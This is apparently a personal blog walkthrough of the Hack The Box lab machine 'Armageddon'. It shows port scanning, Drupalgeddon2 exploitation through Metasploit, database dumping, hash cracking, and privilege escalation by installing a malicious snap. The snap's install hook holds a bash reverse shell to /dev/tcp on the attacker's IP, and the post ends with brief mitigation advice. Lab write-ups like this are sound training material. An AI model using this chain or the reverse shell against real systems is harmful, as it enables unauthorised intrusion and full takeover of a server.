---
layout: post
title: Hack The Box Walkthrough - Armageddon
date: 2022-09-05
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2022/09/HTB/Armageddon
img: 2022/09/Armageddon/Armageddon.png
---

An easy box where I had to exploit Drupal before getting root by abusing snap installs with sudo.

* Room: Armageddon
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/323](https://app.hackthebox.com/machines/323)
* Author: [bertolis](https://app.hackthebox.com/users/27897)

## Initial Foothold

As always, I began attacking the box by looking for open ports.

```bash
$ rustscan -a target -- -v | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.48.89:22
Open 10.129.48.89:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 13:04 EDT
Initiating Ping Scan at 13:04
Scanning 10.129.48.89 [2 ports]
Completed Ping Scan at 13:04, 0.03s elapsed (1 total hosts)
Initiating Connect Scan at 13:04
Scanning target (10.129.48.89) [2 ports]
Discovered open port 22/tcp on 10.129.48.89
Discovered open port 80/tcp on 10.129.48.89
Completed Connect Scan at 13:04, 0.03s elapsed (2 total ports)
Nmap scan report for target (10.129.48.89)
Host is up, received syn-ack (0.030s latency).
Scanned at 2022-09-04 13:04:58 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
```

Port 22 (SSH) and 80 (HTTP) were open. I launched Burp and Firefox to look at the website.

![Website](/assets/images/2022/09/Armageddon/WebSite.png "Website")

The site was very simple. One page, with a login form and links to create an account or reset a password.

I tried to create an account, but it required an email and the box was unable to send emails. Same problem with resetting passwords.

![Create Account](/assets/images/2022/09/Armageddon/CreateAccount.png "Create Account")

I ran feroxbuster on the site.

```bash
$ feroxbuster -u http://target.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -o ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://target.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       20w      235c http://target.htb/profiles => http://target.htb/profiles/
301      GET        7l       20w      232c http://target.htb/sites => http://target.htb/sites/
200      GET      156l      407w     7400c http://target.htb/
301      GET        7l       20w      234c http://target.htb/modules => http://target.htb/modules/
301      GET        7l       20w      235c http://target.htb/includes => http://target.htb/includes/
301      GET        7l       20w      231c http://target.htb/misc => http://target.htb/misc/
403      GET        8l       22w      207c http://target.htb/.html
301      GET        7l       20w      234c http://target.htb/scripts => http://target.htb/scripts/
403      GET        8l       22w      211c http://target.htb/.htaccess
301      GET        7l       20w      233c http://target.htb/themes => http://target.htb/themes/
403      GET        8l       22w      206c http://target.htb/.htm

...

200      GET        6l       19w      174c http://target.htb/.gitignore

...

[####################] - 50s   567792/567792  0s      found:50      errors:0
[####################] - 49s    63088/63088   1282/s  http://target.htb
[####################] - 5s     63088/63088   0/s     http://target.htb/profiles => Directory listing (add -e to scan)
[####################] - 0s     63088/63088   0/s     http://target.htb/sites => Directory listing (add -e to scan)
[####################] - 48s    63088/63088   1313/s  http://target.htb/
[####################] - 4s     63088/63088   0/s     http://target.htb/modules => Directory listing (add -e to scan)
[####################] - 4s     63088/63088   0/s     http://target.htb/includes => Directory listing (add -e to scan)
[####################] - 3s     63088/63088   0/s     http://target.htb/misc => Directory listing (add -e to scan)
[####################] - 3s     63088/63088   0/s     http://target.htb/scripts => Directory listing (add -e to scan)
[####################] - 0s     63088/63088   0/s     http://target.htb/themes => Directory listing (add -e to scan)
```

There was a `.gitignore` file that was accessible.

```http
HTTP/1.1 200 OK
Date: Mon, 05 Sep 2022 14:35:13 GMT
Server: Apache/2.4.6 (CentOS) PHP/5.4.16
Last-Modified: Wed, 21 Jun 2017 18:20:18 GMT
ETag: "ae-5527c6b967c80"
Accept-Ranges: bytes
Content-Length: 174
Connection: close

# Ignore configuration files that may contain sensitive information.
sites/*/settings*.php

# Ignore paths that contain user-generated content.
sites/*/files
sites/*/private
```

I tried loading `.git`, but that failed. There were also some folders that had directory listing enabled on them. I looked into a few of them, they had files that looked interesting, but since they were PHP files, the content was not returned, just the result of their execution.

But looking at the files, it became clear that it was a Drupal site. The headers returned confirmed it, and gave me the version of Drupal that was used.

```http
HTTP/1.1 200 OK
Date: Mon, 05 Sep 2022 14:40:11 GMT
Server: Apache/2.4.6 (CentOS) PHP/5.4.16
X-Powered-By: PHP/5.4.16
Expires: Sun, 19 Nov 1978 05:00:00 GMT
Cache-Control: no-cache, must-revalidate
X-Content-Type-Options: nosniff
Content-Language: en
X-Frame-Options: SAMEORIGIN
X-Generator: Drupal 7 (http://drupal.org)
Content-Length: 7400
Connection: close
Content-Type: text/html; charset=utf-8
```

I looked on [Exploit Database](https://www.exploit-db.com/) for potential vulnerabilities in Drupal 7. It found a few.

![Exploit DB](/assets/images/2022/09/Armageddon/ExploitDb.png "Exploit DB")

All those 'Drupalgeddon' exploits jumped out. I tried a few of the POCs, but I failed to exploit the site.

So I tried Metasploit on the site.

```bash
$ msfconsole

# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v6.2.15-dev                          ]
+ -- --=[ 2241 exploits - 1184 auxiliary - 398 post       ]
+ -- --=[ 867 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Display the Framework log using the
log command, learn more with help log

msf6 > search drupalgeddon

Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/drupal_drupalgeddon2

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.6         yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)


msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS http://target.htb
RHOSTS => http://target.htb
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set LHOST 10.10.14.143
LHOST => 10.10.14.143
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > exploit

[*] Started reverse TCP handler on 10.10.14.143:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (39927 bytes) to 10.129.48.89
[*] Meterpreter session 1 opened (10.10.14.143:4444 -> 10.129.48.89:58460) at 2022-09-05 11:20:39 -0400

meterpreter > shell
Process 3281 created.
Channel 0 created.
whoami
apache
```

## Getting a User

I was on the machine as the apache user. The user did not have access to much. I checked the Drupal configuration and found the database credentials in `site/default/settings.php`.

```php
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'REDACTED',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

I tried connecting to the database. But it did not work well in the shell generated from meterpreter. Instead, I used `mysqldump` to get the database SQL and downloaded it to my machine.

```bash
mysqldump -u drupaluser -p drupal > drupal.sql
Enter password:

exit

meterpreter > download drupal.sql
[*] Downloading: drupal.sql -> /home/ehogue/Kali/OnlineCTFs/HackTheBox/Armageddon/drupal.sql
[*] Downloaded 1.00 MiB of 1.25 MiB (79.88%): drupal.sql -> /home/ehogue/Kali/OnlineCTFs/HackTheBox/Armageddon/drupal.sql
[*] Downloaded 1.25 MiB of 1.25 MiB (100.0%): drupal.sql -> /home/ehogue/Kali/OnlineCTFs/HackTheBox/Armageddon/drupal.sql
[*] download   : drupal.sql -> /home/ehogue/Kali/OnlineCTFs/HackTheBox/Armageddon/drupal.sql
```

Once I had the database dump on my machine, it was easy to find where the users were created.

```sql
INSERT INTO `users` VALUES (0,'','','','','',NULL,0,0,0,0,NULL,'',0,'',NULL),
(1,'brucetherealadmin','$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt','admin@armageddon.eu','','','filtered_html',1606998756,1607077194,1607076276,1,'Europe/London','',0,'admin@armageddon.eu','a:1:{s:7:\"overlay\";i:1;}'),
(3,'admin','$S$Dk7mAXhhZpqElUq7AtOtwgp2qM4qcgXSTKHu289U7aQAQl42Q8uG','admin@test.com','','','filtered_html',1662311453,0,0,0,'Europe/London','',0,'admin@test.com',NULL);
```

The admin user was the one I tried creating. I used hashcat to crack the hash for 'brucetherealadmin'.

```bash
$ hashcat -a0 hash.txt /usr/share/seclists/rockyou.txt --force
hashcat (v6.2.5) starting in autodetect mode

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2873/5810 MB (1024 MB allocatable), 6MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

7900 | Drupal7 | Forums, CMS, E-Commerce

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Uses-64-Bit
* (null)

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:REDACTED

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 7900 (Drupal7)
Hash.Target......: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
Time.Started.....: Sun Sep  4 13:54:08 2022, (6 secs)
Time.Estimated...: Sun Sep  4 13:54:14 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      259 H/s (10.98ms) @ Accel:256 Loops:64 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 1536/14344384 (0.01%)
Rejected.........: 0/1536 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:32704-32768
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> mexico1
Hardware.Mon.#1..: Util: 98%
```

I then used the recovered password to ssh to the server and get the user flag.

```bash
$ ssh brucetherealadmin@target
brucetherealadmin@target's password:
Last failed login: Sun Sep  4 18:45:08 BST 2022 from 10.10.14.143 on ssh:notty
There were 3 failed login attempts since the last successful login.
Last login: Tue Mar 23 12:40:36 2021 from 10.10.14.2

[brucetherealadmin@armageddon ~]$ ls -la
total 16
drwx------. 2 brucetherealadmin brucetherealadmin  99 Dec 14  2020 .
drwxr-xr-x. 3 root              root               31 Dec  3  2020 ..
lrwxrwxrwx. 1 root              root                9 Dec 11  2020 .bash_history -> /dev/null
-rw-r--r--. 1 brucetherealadmin brucetherealadmin  18 Apr  1  2020 .bash_logout
-rw-r--r--. 1 brucetherealadmin brucetherealadmin 193 Apr  1  2020 .bash_profile
-rw-r--r--. 1 brucetherealadmin brucetherealadmin 231 Apr  1  2020 .bashrc
-r--------. 1 brucetherealadmin brucetherealadmin  33 Sep  4 17:57 user.txt

[brucetherealadmin@armageddon ~]$ cat user.txt
REDACTED
```

## Getting root.

Once I was on the machine, getting root was simple. I looked for what I could run with sudo.

```
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

I could install any snap packages. I went to [GTFOBins](https://gtfobins.github.io/gtfobins/snap/) for ways to abuse that. 

The proposed code create an empty snap package and use a hook in the package to run commands.

I used the code from GTFOBins to create a snap on my machine and upload it to the server. And I started a netcat listener for my reverse shell.

```bash
$ COMMAND="bash -c 'bash -i >& /dev/tcp/10.10.14.143/4444 0>&1'"

$ mkdir -p snap/meta/hooks

$ cd snap

$ printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install

$ chmod +x meta/hooks/install

$ fpm -n xxxx -s dir -t snap -a all meta
Created package {:path=>"xxxx_1.0_all.snap"}

$ scp xxxx_1.0_all.snap brucetherealadmin@target:~/
brucetherealadmin@target's password: 

$ nc -klvnp 4444
listening on [any] 4444 ...
```

Then, I went on the server and installed the snap I just created.

```bash
[brucetherealadmin@armageddon ~]$ sudo /usr/bin/snap install xxxx_1.0_all.snap --dangerous --devmode
Run install hook of "xxxx" snap if present
```

I got a hit on my reverse shell. 

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.143] from (UNKNOWN) [10.129.48.89] 58464
bash: cannot set terminal process group (4594): Inappropriate ioctl for device
bash: no job control in this shell

bash-4.3# whoami
whoami
root

bash-4.3# cat /root/root.txt
cat /root/root.txt
REDACTED
```

## Mitigation

To make this box safer, you need to make sure it is kept up to date. The Drupalgeddon vulnerabilities are easy to find and exploit. Keeping Drupal up to date would have prevented that issue.

As for the snap exploit, do not give normal users permission to install random packages on a server.